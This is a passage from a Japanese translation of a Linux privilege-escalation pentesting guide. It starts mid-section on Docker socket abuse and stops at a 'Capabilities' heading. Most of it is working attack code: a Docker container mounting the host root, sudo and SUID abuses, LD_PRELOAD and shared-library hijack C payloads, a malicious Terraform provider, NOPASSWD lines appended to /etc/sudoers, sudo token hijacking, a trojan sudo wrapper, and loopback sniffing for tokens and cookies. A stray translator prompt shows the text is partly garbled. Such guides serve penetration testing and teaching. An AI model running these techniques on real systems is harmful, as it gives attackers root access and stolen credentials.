curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

作成したコンテナを起動する:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` を使ってコンテナに接続し、その中でコマンドを実行できるようにします。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` 接続を設定した後、コンテナ内でコマンドを実行し、ホストのファイルシステムに対して root 権限でアクセスできます。

### その他

docker ソケットに対して書き込み権限があり、**group `docker` のメンバーである**場合、[**より多くの権限昇格方法**](interesting-groups-linux-pe/index.html#docker-group)があります。もし [**docker API がポートでリッスンしている**場合も、それを危険にさらせる可能性があります](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

コンテナからの脱出やコンテナランタイムの悪用による権限昇格の**その他の方法**は次を参照してください:


{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) の権限昇格

`ctr` コマンドを使用できる場合、次のページを参照してください。**権限昇格に悪用できる可能性があります**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** の権限昇格

`runc` コマンドを使用できる場合、次のページを参照してください。**権限昇格に悪用できる可能性があります**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus は高度な **プロセス間通信 (IPC) システム** であり、アプリケーション間の効率的な相互作用とデータ共有を可能にします。モダンな Linux システムを念頭に設計されており、さまざまな形態のアプリケーション通信に対する堅牢なフレームワークを提供します。

このシステムは多用途で、プロセス間のデータ交換を強化する基本的な IPC（拡張された UNIX ドメインソケット を彷彿とさせる）をサポートします。さらに、イベントやシグナルのブロードキャストを支援し、システムコンポーネント間のシームレスな統合を促進します。例えば、Bluetooth デーモンからの着信通知のシグナルが音楽プレーヤーにミュートを促すことでユーザ体験が向上します。加えて、D-Bus はリモートオブジェクトシステムをサポートしており、サービス要求やメソッド呼び出しをアプリケーション間で簡素化し、従来は複雑だった処理を効率化します。

D-Bus は **allow/deny model** で動作し、マッチするポリシールールの累積的な効果に基づいてメッセージの権限（メソッド呼び出し、シグナル送出など）を管理します。これらのポリシーはバスとの相互作用を指定しており、これらの権限を悪用することで権限昇格が発生する可能性があります。

`/etc/dbus-1/system.d/wpa_supplicant.conf` にあるそのようなポリシーの例が示されており、root ユーザが `fi.w1.wpa_supplicant1` を所有し、送信および受信できる権限が記載されています。

ユーザやグループが指定されていないポリシーは全体に適用され、"default" コンテキストのポリシーは他の特定のポリシーでカバーされていないものすべてに適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**ここで D-Bus communication を enumerate と exploit する方法を学びます：**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを enumerate してマシンの位置を特定するのは常に興味深い。

### 一般的な enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### アウトバウンドフィルタリングの簡易トリアージ

ホストがコマンドを実行できるがコールバックが失敗する場合は、DNS、transport、proxy、route のフィルタリングを迅速に切り分ける:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### 開いているポート

アクセスする前にやり取りできなかったマシン上で稼働しているネットワークサービスも必ず確認してください:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
バインド先でリスナーを分類:

- `0.0.0.0` / `[::]`: すべてのローカルインターフェースで公開。
- `127.0.0.1` / `::1`: ローカル限定（tunnel/forward の候補として適切）。
- 特定の内部 IP（例: `10.x`, `172.16/12`, `192.168.x`, `fe80::`）: 通常は内部セグメントからのみ到達可能。

### ローカル限定サービスのトリアージワークフロー

ホストを compromise すると、`127.0.0.1` にバインドされたサービスがあなたの shell から初めて到達可能になることがよくあります。簡単なローカルでのワークフローは次のとおりです：
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS をネットワークスキャナとして（ネットワークのみモード）

ローカルの PE チェックに加え、linPEAS は特化したネットワークスキャナとして実行できます。利用可能なバイナリを `$PATH` 内から使用します（通常 `fping`, `ping`, `nc`, `ncat`）。ツールをインストールしません。
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
If you pass `-d`, `-p`, or `-i` without `-t`, linPEAS behaves as a pure network scanner (残りの privilege-escalation checks をスキップします)。

### Sniffing

トラフィックをsniffできるか確認してください。可能なら、いくつかのcredentialsを入手できるかもしれません。
```
timeout 1 tcpdump
```
簡単な実践チェック:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
ループバック (`lo`) は、post-exploitation において特に価値があります。多くの内部専用サービスがそこで tokens/cookies/credentials を公開しているため:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
翻訳する README.md の内容を貼ってください。
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Users

### Generic Enumeration

自分が**who**で、どの**privileges**を持っているか、システムにどの**users**が存在するか、どのユーザーが**login**できるか、どのユーザーが**root privileges**を持っているかを確認する:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

一部の Linux バージョンは、**UID > INT_MAX** を持つユーザーが権限昇格できるバグの影響を受けていました。詳細情報: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### グループ

root 権限を付与する可能性のある**グループのメンバー**かどうかを確認してください:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### クリップボード

可能であれば、クリップボード内に何か興味深いものがないか確認してください
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

環境の**いずれかのパスワードを知っている場合**は、そのパスワードを使って**各ユーザとしてログインを試みてください**。

### Su Brute

多くのノイズを出しても構わない場合、かつ `su` と `timeout` バイナリがコンピュータ上に存在するなら、[su-bruteforce](https://github.com/carlospolop/su-bruteforce) を使ってユーザのブルートフォースを試みることができます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は `-a` パラメータでユーザのブルートフォースも試みます。

## 書き込み可能な $PATH の悪用

### $PATH

もし **$PATH のいずれかのフォルダに書き込みできる** ことが分かったら、書き込み可能なフォルダ内に、別ユーザ（理想的には root）が実行するコマンド名と同じ名前で**バックドアを作成する**ことで権限昇格できる可能性があります。ただし、そのコマンドが **$PATH においてあなたの書き込み可能フォルダより前にあるフォルダからロードされない** 必要があります。

### SUDO and SUID

sudo で実行できるコマンドがある、またはファイルに suid ビットが設定されている場合があります。確認するには:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
いくつかの **予期しない commands は、ファイルを読み取りおよび/または書き込み、さらには commands を実行することさえできます。** 例えば:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo の設定によって、ユーザーがパスワードを知らなくても別のユーザーの権限でコマンドを実行できる場合がある。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例では、ユーザー `demo` が `root` として `vim` を実行できるため、root directory に ssh key を追加するか `sh` を呼び出すことで簡単に shell を取得できます。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブは、何かを実行する際にユーザーが**環境変数を設定する**ことを許可します:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**based on HTB machine Admirer** を元にしており、スクリプトを root として実行する際に任意の python ライブラリをロードするための **PYTHONPATH hijacking** に **vulnerable** でした:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### sudo env_keep で BASH_ENV が保持されると → root shell

もし sudoers が `BASH_ENV` を保持している場合（例: `Defaults env_keep+="ENV BASH_ENV"`）、許可されたコマンドを呼び出す際に Bash の非対話的な起動挙動を利用して、root として任意のコードを実行できます。

- Why it works: 非対話シェルでは、Bash は `$BASH_ENV` を評価し、ターゲットスクリプトを実行する前にそのファイルを source します。多くの sudo ルールはスクリプトやシェルラッパーの実行を許可します。`BASH_ENV` が sudo によって保持されている場合、あなたのファイルは root 権限で source されます。

- 要件:
- 実行可能な sudo ルール（非対話的に `/bin/bash` を呼び出すターゲット、または任意の bash スクリプト）。
- `env_keep` に `BASH_ENV` が含まれていること（`sudo -l` で確認）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- ハードニング：
- `env_keep` から `BASH_ENV`（および `ENV`）を削除し、`env_reset` を推奨。
- sudo 許可コマンドに対するシェルラッパーを避け、最小限のバイナリを使用する。
- 保存された env vars が使われる場合の sudo の I/O ロギングとアラートを検討する。

### Terraform: sudo 経由で HOME が保持されている場合 (!env_reset)

もし sudo が環境をそのままにする（`!env_reset`）状態で `terraform apply` を許可すると、`$HOME` は呼び出し元ユーザーのままになります。したがって Terraform は root として **$HOME/.terraformrc** を読み込み、`provider_installation.dev_overrides` を尊重します。

- 必要な provider を書き込み可能なディレクトリに向け、プロバイダ名に合わせた悪意のあるプラグイン（例: `terraform-provider-examples`）を配置する：
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform は Go プラグインのハンドシェイクに失敗しますが、終了する前に payload を root として実行し、SUID シェルを残します。

### TF_VAR 上書き + symlink バリデーション回避

Terraform の変数は `TF_VAR_<name>` 環境変数を通じて渡すことができ、sudo が環境を保持する場合に有効です。`strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` のような脆弱なバリデーションは symlink により回避可能です：
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform resolves the symlink and copies the real `/root/root.txt` into an attacker-readable destination. The same approach can be used to **書き込む** into privileged paths by pre-creating destination symlinks (e.g., pointing the provider’s destination path inside `/etc/cron.d/`).

### requiretty / !requiretty

On some older distributions, sudo can be configured with `requiretty`, which forces sudo to run only from an interactive TTY. If `!requiretty` is set (or the option is absent), sudo can be executed from non-interactive contexts such as reverse shells, cron jobs, or scripts.
```bash
Defaults !requiretty
```
これはそれ自体が直接の脆弱性ではありませんが、フル PTY を必要とせずに sudo ルールが悪用されうる状況を拡大します。

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

`sudo -l` が `env_keep+=PATH` を示すか、または攻撃者が書き込み可能なエントリ（例: `/home/<user>/bin`）を含む `secure_path` がある場合、sudo 許可対象内の相対コマンドは上書きされ得ます。

- 要件: 絶対パスを使わずにコマンドを呼び出すスクリプト/バイナリを実行する sudo ルール（多くは `NOPASSWD`）と、先に検索される書き込み可能な PATH エントリ。
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo 実行のバイパスに使うパス
**ジャンプ** を使って他のファイルを読むか、**symlinks** を使います。 For example in sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
もし **wildcard** が使用されている（\*）場合は、さらに簡単になります:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID バイナリ — コマンドのパスが指定されていない場合

もし単一のコマンドに対して **sudo 権限** が与えられ、**パスが指定されていない**: _hacker10 ALL= (root) less_、PATH 環境変数を変更することでこれを悪用できます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
このテクニックは、**suid** バイナリ **パスを指定せずに別のコマンドを実行する場合（奇妙な SUID バイナリの内容は必ず _**strings**_ で確認してください）**。

[Payload examples to execute.](payloads-to-execute.md)

### SUID バイナリ（コマンドパスあり）

もし **suid** バイナリが**パスを指定して別のコマンドを実行する**場合、suid ファイルが呼び出しているコマンド名で**関数を作成してexportする**ことを試みることができます。

例えば、suid バイナリが _**/usr/sbin/service apache2 start**_ を呼び出す場合、関数を作成してexportすることを試す必要があります:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
その後、SUIDバイナリを呼び出すと、この関数が実行されます

### SUIDラッパーによって実行される書き込み可能なスクリプト

よくあるカスタムアプリのミスコンフィギュレーションは、root所有のSUIDバイナリラッパーがスクリプトを実行する一方で、そのスクリプト自体が低権限ユーザーによって書き込み可能になっていることです。

典型的なパターン:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
`/usr/local/bin/backup.sh` が書き込み可能であれば、payload commands を追記してから SUID wrapper を実行できます:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
クイックチェック：
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
This attack path is especially common in "maintenance"/"backup" wrappers shipped in `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

However, to maintain system security and prevent this feature from being exploited, particularly with **suid/sgid** executables, the system enforces certain conditions:

- The loader disregards **LD_PRELOAD** for executables where the real user ID (_ruid_) does not match the effective user ID (_euid_).
- For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.

Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env_keep+=LD_PRELOAD**. This configuration allows the **LD_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c** として保存
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に、**compile it** を使用して:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**escalate privileges** を実行します。
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 攻撃者が**LD_LIBRARY_PATH**環境変数を制御している場合、同様のprivescが悪用される可能性があります。これはライブラリが検索されるパスを攻撃者が制御できるためです。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

通常とは異なる **SUID** 権限を持つバイナリに遭遇した場合、**.so** ファイルを正しくロードしているか確認することが推奨されます。これは次のコマンドを実行して確認できます:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、_"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ のようなエラーに遭遇した場合、それはexploitationの可能性を示唆します。

To exploit this, まずCファイルを作成します。例えば _"/path/to/.config/libcalc.c"_ に以下のコードを含めます:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルして実行すると、file permissions を操作し、shell を実行することで elevate privileges を行うことを目的としています。

上記の C file を shared object (.so) ファイルにコンパイルするには、次のコマンドを使用します:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最後に、影響を受けた SUID バイナリを実行すると exploit が発動し、システムの侵害につながる可能性があります。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
書き込み可能なフォルダからライブラリをロードする SUID バイナリを見つけたので、そのフォルダに必要な名前でライブラリを作成しましょう:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
次のようなエラーが発生した場合
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. [**GTFOArgs**](https://gtfoargs.github.io/) is the same but for cases where you can **only inject arguments** in a command.

The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Sudoトークンの再利用

場合によっては、あなたに **sudo access** があるがパスワードがない場合、sudo コマンドの実行を待ってセッションのトークンをハイジャックすることで権限を昇格できます。

権限を昇格するための要件:

- あなたは既にユーザー "_sampleuser_" としてシェルを持っている
- "_sampleuser_" は **過去15分以内に `sudo` を使用して** 何かを実行している（デフォルトではこれはパスワードを要求せずに `sudo` を使える期間）
- `cat /proc/sys/kernel/yama/ptrace_scope` が 0 である
- `gdb` にアクセスできる（アップロードできる）

(一時的に `ptrace_scope` を有効にするには `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`、または永続的にするには `/etc/sysctl.d/10-ptrace.conf` を修正して `kernel.yama.ptrace_scope = 0` を設定します)

これらの要件がすべて満たされていれば、**次を使って権限を昇格できます：** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- 最初の **exploit** (`exploit.sh`) はバイナリ `activate_sudo_token` を _/tmp_ に作成します。これを使って **あなたのセッションで sudo トークンを有効化** できます（自動的に root シェルが得られるわけではありません。`sudo su` を実行してください）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **2番目の exploit** (`exploit_v2.sh`) は _/tmp_ に root 所有で setuid が付いた sh shell を作成します
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **3番目の exploit** (`exploit_v3.sh`) は **sudoers file を作成** し、**sudo tokens を永続化して全ユーザーが sudo を使用できるようにします**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

フォルダ内、またはフォルダ内で作成されたファイルのいずれかに対して**書き込み権限**がある場合、バイナリ[**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools)を使用して**ユーザーとPID用の sudo token を作成**できます。\
例えば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、かつそのユーザーとして PID 1234 のシェルを持っている場合、パスワードを知らなくても次のようにして**sudo 権限を取得**できます:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

ファイル `/etc/sudoers` と `/etc/sudoers.d` 内のファイルは、誰が `sudo` を使用できるか、およびその方法を設定します。これらのファイルは**デフォルトでは root ユーザーおよび root グループのみが読み取れます**。\
**もし**このファイルを**読み取る**ことができれば、**興味深い情報を取得できる場合があります**。また、もし任意のファイルに**書き込み**できるのであれば、**escalate privileges** が可能になります。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込み可能であれば、この権限を悪用できます
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` バイナリの代替として、OpenBSD 用の `doas` などがあります。設定は `/etc/doas.conf` を確認してください。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

もし**ユーザーが普段マシンに接続して `sudo` を使って権限昇格する**ことが分かっていて、かつそのユーザーコンテキストでシェルを取得している場合、**新しい sudo 実行ファイルを作成**して、まず root としてあなたのコードを実行し、その後にユーザーのコマンドを実行させることができます。次に、ユーザーコンテキストの**$PATH を変更**し（例えば .bash_profile に新しいパスを追加する）、ユーザーが sudo を実行したときにあなたの sudo 実行ファイルが実行されるようにします。

ユーザーが別のシェル（bash 以外）を使っている場合は、新しいパスを追加するために他のファイルを変更する必要がある点に注意してください。例えば[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` を変更します。別の例は [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) にあります。

または、次のようなコマンドを実行する:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は、**読み込まれる設定ファイルがどこから来るか**を示します。通常、このファイルには次のパスが含まれています: `include /etc/ld.so.conf.d/*.conf`

つまり、`/etc/ld.so.conf.d/*.conf` の設定ファイルが読み込まれます。これらの設定ファイルは**他のフォルダを指しており**、**ライブラリ**が**検索**される場所を指定します。例えば、`/etc/ld.so.conf.d/libc.conf` の内容が `/usr/local/lib` であれば、**これはシステムが `/usr/local/lib` 内でライブラリを検索することを意味します**。

もし何らかの理由で、示されたパスのいずれか（`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` に記載された設定ファイル内の任意のフォルダ）に対して**ユーザが書き込み権限を持っている**場合、権限昇格が可能になることがあります。\
次のページで、この設定ミスを**どのように悪用するか**を確認してください:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib を `/var/tmp/flag15/` にコピーすると、`RPATH` 変数で指定されている通り、プログラムはこの場所のものを使用します。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に、`/var/tmp` に悪意のあるライブラリを次のコマンドで作成します：`gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

